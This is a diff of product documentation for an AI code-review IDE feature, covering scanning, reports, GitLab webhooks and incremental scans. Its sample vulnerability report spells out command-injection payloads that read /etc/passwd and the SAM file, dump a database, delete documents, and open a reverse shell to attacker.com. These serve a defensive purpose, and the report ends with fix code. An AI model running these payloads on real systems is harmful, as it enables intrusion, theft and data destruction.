@@ -6,7 +6,6 @@ sidebar_position: 10
 
 CoStrict Code Review is an intelligent code quality inspection tool that precisely covers four categories of defects: logical defects, security vulnerabilities, static defects, and memory issues. It provides complete defect tracing with actionable fix recommendations, making your coding more focused and your submissions more confident.
 
-
 ## How to Use
 
 ### Interactive Scan
@@ -17,66 +16,218 @@ CoStrict Code Review is an intelligent code quality inspection tool that precise
 
 In the file explorer, **right-click on a file** and select **CoStrict > Code Review** to perform a code scan on the entire file.
 
+<!-- TODO: Add screenshot - 扫描代码文件 -->
+![Scan code file](./img/codereview/IDE使用1-扫描代码文件.png)
+
 ##### Method 2: Scan Selected Code Snippet
 
 In the editor, **select a code snippet**, then **right-click** and choose **Code Review** to scan the selected code.
+
+<!-- TODO: Add screenshot - 扫描代码片段 -->
+![Scan code snippet](./img/codereview/IDE使用2-扫描代码片段.png)
 
 ##### Method 3: Scan Code Changes
 
 Click the **CoStrict icon** on the left sidebar, switch to the **Code Scan** page, and scan code changes in the current workspace.
 
+<!-- TODO: Add screenshot - 扫描代码变更 -->
+![Scan code changes](./img/codereview/IDE使用3-扫描代码变更.png)
+
 #### Scan Report
 
-##### View Report
+After triggering a code review, the CODE REVIEW panel displays real-time progress. The scanning duration is proportional to the amount of code being processed, ranging from a few minutes to several tens of minutes. Once the scan is complete, the CODE REVIEW panel displays the results.
 
-After the scan is complete, results are displayed in the sidebar panel, including:
+**View Issue List**
 
 - **Scan Summary**: The number of files scanned and the total number of issues found
-- **Issue List**: Detailed information for each security issue
-  - File path and line number
-  - Severity level
-  - Issue description
-  - Fix suggestions
+- **Issue List**: File path, line number, description, and severity level, with color bars indicating severity: <span style={{color: '#E53935'}}>**Red (High)**</span>, <span style={{color: '#FDD835'}}>**Yellow (Medium)**</span>, <span style={{color: '#42A5F5'}}>**Blue (Low)**</span>
+- **Issue Filtering**: Filter by severity, issue labels, and other conditions
 
-##### Handle Defects
+<!-- TODO: Add screenshot - 侧边栏面板 -->
+![Sidebar panel](./img/codereview/IDE使用-侧边栏面板.png)
 
-Click on an issue to view details in the code editor. We encourage users to click the buttons in the top-right corner of the detail card according to the actual situation. There are three buttons: `Accept`, `Reject`, and `Close`:
+**View Issue Details**
 
-- **Accept**: Indicates that you agree with the issue identified by the AI
-- **Reject**: Indicates that you believe this is not an issue or the output is incorrect
-- **Close**: Closes the current detail window
+Click on an issue to view details in the code editor. The corresponding problematic code line will be automatically located and highlighted, with a detailed report displayed in a floating panel below.
 
-## Execution Process & Results
+**Defect Analysis** - Analyzes the root cause, trigger conditions, and exploitation methods
+**Business Impact** - Assesses security risks and potential attack scenarios
+**Fix Recommendations** - Provides actionable fix solutions and reference code
 
+<details>
+<summary>View Complete Example</summary>
 
-After triggering a code review, the CODE REVIEW panel in CoStrict will display the real-time progress. The scanning duration is proportional to the amount of code being processed, ranging from a few seconds to several tens of minutes.
+## <span style={{color: '#E53935'}}>[High]</span> Command Injection Vulnerability - Incomplete Blacklist Filter Allows Pipe Bypass
 
+### Defect Analysis
 
-The review results will be displayed as a list. Accodring to the title description,  the color bar on the left , and the issue labels.
-You can get a general overview of the issues and its severity.
+**Root Cause:** The blacklist filtering mechanism has serious design flaws
 
+- Line 12: `'| '` → Only filters "pipe+space" combination, single `|` character is not filtered
+- Line 9: `'||'` → `''` Although `||` is filtered, attackers can use a single `|` for command injection
+- Line 10: `'&'` → `''` Filters single `&`, so `&&` bypass is ineffective (will be split and filtered)
 
-Three color bars—red, yellow, and blue—correspond to the severity levels: high, medium, and low. Click on an issue to view details in the code editor. The corresponding problematic code line will be automatically located and highlighted`. A pop-up window below the issue line displays detailed information.
+---
 
-![alt text](./img/15.png)
+### Trigger Conditions
 
+**Attacker Input:** `127.0.0.1|whoami` (Windows/Linux universal)
 
-In order to make the Codereview feature more intelligent and better trained for future use, we encourage users to click the buttons in the top-right corner of the detail card according to the actual situation. There are three buttons: `Accept`, `Reject,` and `Close`.
-- Accept: Indicates that you agree with the issue identified by the AI.
+**Process:**
+1. After `str_replace()` processing, the `|` character is retained (because it doesn't match the `'| '` pattern)
+2. Final execution: `ping 127.0.0.1|whoami`
+3. Result: The `whoami` command is executed and returns results
 
-- Reject: Indicates that you believe this is not an issue or the output is incorrect, and you do not agree with the result.
+---
 
-- Close: Closes the current detail window.
+### Bypass Methods
 
-![alt text](./img/16.png)
+| Type | Example |
+|------|---------|
+| Universal bypass | Use a single `|` pipe |
+| Windows | `127.0.0.1\|dir`, `127.0.0.1\|type C:\Windows\System32\config\SAM` |
+| Linux | `127.0.0.1\|cat /etc/passwd`, `127.0.0.1\|id` |
 
+---
 
-## Filter Conditions
+### Business Impact
 
-Code Review supports filtering issues based on three dimensions: severity, issue labels, and confidence level.
+**Security Risks:**
 
-- **Severity**: High, medium, low, corresponding to the color bars on the left side of the issue list: red, yellow, blue.
+- **Remote Code Execution** - Attackers can execute arbitrary system commands
+- **Full System Control** - Lateral movement after gaining web server access
+- **Data Theft** - Read sensitive files (database configs, user data, keys, etc.)
+- **Privilege Escalation** - Escalate to root/administrator through system vulnerabilities
+- **Persistent Attacks** - Plant backdoors, Web Shells, malicious scripts
 
-- **Labels**: The AI automatically categorizes and tags issues based on their descriptions. Typically, an issue will have one or more tags. Common issue label types include: syntax errors, logic errors, memory leaks, security vulnerabilities, etc.
+**Attack Scenarios:**
 
-![alt text](./img/17.png)
+- Information gathering: `\|cat /etc/passwd` to get user list
+- Database theft: `\|mysqldump -u root -p database > dump.sql`
+- Reverse shell: `\|bash -i >& /dev/tcp/attacker.com/4444 0>&1`
+- Ransomware: `\|find / -name "*.doc" -exec rm {} \;`
+
+---
+
+### Fix Recommendations
+
+**Solution 1: Use Whitelist Validation (Recommended)**
+
+```php
+if( !preg_match( '/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', $target ) ) {
+    die( 'Invalid IP address format' );
+}
+```
+
+**Solution 2: Escape Dangerous Characters (Not Recommended, Still Bypassable)**
+
+```php
+$target = escapeshellarg( $target );
+$cmd = shell_exec( 'ping ' . $target );
+```
+
+**Solution 3: Remove All Non-Essential Characters**
+
+```php
+$target = preg_replace( '/[^0-9.]/', '', $target );
+```
+
+</details>
+
+<!-- TODO: Add screenshot - 完整效果 -->
+![Complete effect](./img/codereview/IDE使用-完整效果.png)
+
+**View Defect History**
+
+Click the clock icon in the top-right corner of the panel to view historical scan records. The history panel includes the following features:
+
+- **Record List**: Displays all scanned files and scan times
+- **Expand Records**: Click a record to expand and view specific defect entries
+- **Record Management**: Each record and defect entry supports deletion
+
+After expanding a history record, you can view the code and defect details for that scan on the right side.
+
+<!-- TODO: Add screenshot - 审查历史 -->
+![Review history](./img/codereview/IDE使用-审查历史.png)
+
+**Handle Defects**
+
+The defect detail card provides four action buttons in the top-right corner:
+
+- **Accept**: Acknowledge the issue, keep code unchanged
+- **Reject**: Dismiss the issue, consider it not a problem or AI output is incorrect
+- **Fix**: Apply the fix solution, automatically repair code with context
+- **Close**: Close the detail card
+
+Your feedback will help make the Code Review feature smarter and more accurate.
+
+<!-- TODO: Add screenshot - 处置缺陷 -->
+![Handle defects](./img/codereview/IDE使用-处置缺陷.png)
+
+### Team Collaboration
+
+Supports deep integration with enterprise GitLab for automated quality review of merge requests, flexibly adapting to personal development and team collaboration workflows (for private deployment only)
+
+#### Create Access Token
+
+<!-- TODO: Add screenshot - 创建访问令牌 (4张) -->
+![Access token step 1](img/codereview/1.png)
+![Access token step 2](img/codereview/2.png)
+![Access token step 3](img/codereview/3.png)
+![Access token step 4](img/codereview/4.png)
+
+**Note:** After generating the token, do not close the page immediately. Once the page is refreshed or closed, the token cannot be retrieved again.
+
+#### Configure Webhook
+
+- Configuration entry:
+
+<!-- TODO: Add screenshot - webhook配置入口 -->
+![Webhook configuration](img/codereview/5.png)
+
+- Required parameters:
+
+Webhook URL: `https://xxx/code-review/api/v1/webhooks/gitlab`
+
+Secret Token: Use the token created above, **can be left blank**
+
+<!-- TODO: Add screenshot - webhook配置步骤 (6张) -->
+![Webhook step 1](img/codereview/6.png)
+![Webhook step 2](img/codereview/7.png)
+![Webhook step 3](img/codereview/8.png)
+![Webhook step 4](img/codereview/9.png)
+![Webhook step 5](img/codereview/10.png)
+![Webhook step 6](img/codereview/11.png)
+
+**Return 200 indicates successful test**
+
+---
+
+### Incremental Scan
+
+Incremental scan only scans the changed parts of the code, making it more efficient than full scan and suitable for quick checks during daily development.
+
+#### Use Cases
+
+- **Pre-commit Check**: Quickly check newly added or modified code before committing
+- **PR/MR Review**: Focused review of changes in merge requests
+- **Continuous Integration**: Only scan current commit changes in CI pipeline
+
+#### Enable Method
+
+Click the **CoStrict icon** on the left sidebar, switch to the **CODE REVIEW** page, and check the **Scan Changes Only** option to enable incremental scan mode.
+
+<!-- TODO: Add screenshot - 增量扫描 -->
+![Incremental scan](./img/codereview/IDE使用-增量扫描.png)
+
+Once enabled, the scan will automatically identify the scope of changes based on Git Diff, analyzing only modified, added, and deleted code lines.
+
+#### Scan Scope
+
+Incremental scan identifies the following types of changes:
+
+- **New Code**: Newly added code lines
+- **Modified Code**: Changed code lines
+- **Deleted Code**: Removed code lines (used to check if deletions introduce risks)
+
+> **Tip**: Incremental scan only analyzes code changes themselves and does not involve the complete context of cross-file references. For comprehensive analysis, please use full scan mode.
